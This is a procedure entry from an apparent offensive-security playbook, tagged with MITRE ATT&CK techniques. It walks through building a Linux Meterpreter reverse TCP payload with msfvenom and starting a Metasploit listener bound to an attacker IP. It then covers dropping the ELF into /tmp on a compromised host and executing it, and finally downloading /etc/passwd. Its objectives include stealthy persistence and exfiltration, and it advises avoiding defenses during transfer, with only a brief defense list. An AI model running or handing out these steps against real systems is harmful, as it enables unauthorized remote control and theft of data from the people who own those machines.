---
id: 1483bdb7-35db-4f04-af0d-c86c75eaeb3d
name: Establish-Linux-Meterpreter-Reverse-TCP-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.903147+00:00'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/Unix Shell|T1059.004 - Unix
    Shell]]
tags:
  - '[[tags/linux]]'
  - '[[tags/meterpreter]]'
  - '[[tags/reverse-shell]]'
  - '[[tags/metasploit]]'
  - '[[tags/post-exploitation]]'
commands:
  - '[[commands/msfvenom-generate-linux-meterpreter-reverse-tcp]]'
  - '[[commands/msfconsole-setup-multi-handler]]'
platforms:
  - Linux
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Establish-Linux-Meterpreter-Reverse-TCP-Shell

## Summary

This procedure outlines how to generate a stageless Meterpreter reverse TCP payload for Linux x86 systems using msfvenom, set up a listener with Metasploit's multi-handler, transfer and execute the payload on a target Linux machine, and establish an interactive Meterpreter session for post-exploitation activities such as command execution, file transfer, and persistence.

## Description

The Linux Meterpreter Reverse TCP Shell is an advanced post-exploitation payload from the Metasploit Framework that provides a full-featured remote shell without requiring a stager (stageless design). Once executed on the target, it connects back to the attacker's listener, granting access to a Meterpreter session capable of running commands, uploading/downloading files, escalating privileges, and pivoting to other systems. This technique is commonly used after initial access (e.g., via exploited services or phishing) to maintain control over Linux servers in reconnaissance, lateral movement, or data exfiltration scenarios. The payload uses TCP for the reverse connection, making it suitable for environments where outbound connections are allowed but inbound are restricted by firewalls.

## Requirements

1. Attacker machine with Metasploit Framework installed (Kali Linux recommended).
2. Network connectivity between attacker and target, with the target able to reach the attacker's IP on the specified port (e.g., no firewall blocking outbound TCP to attacker).
3. Initial access to the target Linux x86 system to transfer and execute the payload (e.g., via SSH, web shell, or exploited vulnerability).
4. Administrative or user-level privileges on the target for execution (higher privileges enable more Meterpreter features like privilege escalation).
5. Knowledge of target's architecture (x86 confirmed; adjust for x64 if needed).

## Defense

- Implement application whitelisting and execute-only memory protections to prevent unauthorized binary execution.
- Monitor for suspicious outbound network connections to unusual IPs/ports using network intrusion detection systems (NIDS) like Snort or Suricata.
- Enable endpoint detection and response (EDR) tools to scan for Metasploit payloads and anomalous process behaviors (e.g., ELF binaries connecting back).
- Use host-based firewalls to restrict outbound connections and log all executed binaries.
- Regularly patch Linux systems and monitor for ELF files in temporary directories.

## Objectives

1. Generate a custom Meterpreter reverse TCP payload tailored to the target's network.
2. Establish a persistent, interactive shell session for remote command execution.
3. Enable post-exploitation tasks like file exfiltration or privilege escalation from the Meterpreter session.
4. Maintain stealthy access without leaving obvious artifacts on the target.

## Instructions

### Step 1: Generate the Meterpreter Payload

**Context**: Use msfvenom to create a stageless ELF binary payload that will connect back to your listener upon execution. This step produces the executable file to transfer to the target.

**Command** ([[commands/msfvenom-generate-linux-meterpreter-reverse-tcp]]):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_LISTEN_PORT -f elf > meterpreter_reverse.elf
```

> This command binds the payload's callback to your attacker's IP and port. Replace placeholders before running. The output is an ELF binary suitable for Linux x86. Verify the file size (typically ~100-200 KB) and ensure no errors in msfvenom output.

### Step 2: Set Up the Metasploit Listener

**Context**: Configure a multi-handler in msfconsole to catch the incoming connection from the payload. This creates the server-side component for the reverse shell.

**Command** ([[commands/msfconsole-setup-multi-handler]]):
```bash
msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $_ATTACKER_IP; set LPORT $_LISTEN_PORT; exploit -j"
```

> Launch msfconsole in quiet mode and directly configure the handler matching the payload. The '-j' flag runs it as a background job. Expected output includes "[*] Started reverse TCP handler on $_ATTACKER_IP:$_LISTEN_PORT". Keep this running while executing the payload on the target.

### Step 3: Transfer the Payload to the Target

**Context**: Move the generated ELF file to the compromised Linux system. This requires prior access, such as via an existing shell, SCP, or web upload vulnerability.

**Instructions**: If you have SSH access, use `scp meterpreter_reverse.elf user@target_ip:/tmp/`. For web shells, upload via HTTP POST. Make the file executable with `chmod +x /tmp/meterpreter_reverse.elf` on the target.

> Ensure the transfer method doesn't alert defenses (e.g., avoid direct downloads if monitored). Expected confirmation: File present and executable on target (ls -la /tmp/meterpreter_reverse.elf shows -rwxr-xr-x permissions).

### Step 4: Execute the Payload on the Target

**Context**: Run the ELF binary on the target to initiate the reverse connection to your listener.

**Instructions**: On the target, execute `./meterpreter_reverse.elf` from the shell (e.g., via existing access). No output is expected if successful, as the payload runs silently and connects back.

> Monitor your msfconsole listener for the incoming session. If the target has execution restrictions (e.g., SELinux), you may need to bypass them first.

### Step 5: Interact with the Meterpreter Session

**Context**: Once connected, use Meterpreter commands to interact with the target system.

**Instructions**: In msfconsole, when the session appears (e.g., "[*] Meterpreter session 1 opened"), run `sessions -i 1` to enter the session. Then use commands like `sysinfo`, `getuid`, `shell`, or `download /etc/passwd`.

> Success is indicated by full Meterpreter prompt (meterpreter >). Test with `pwd` to confirm current directory on target.
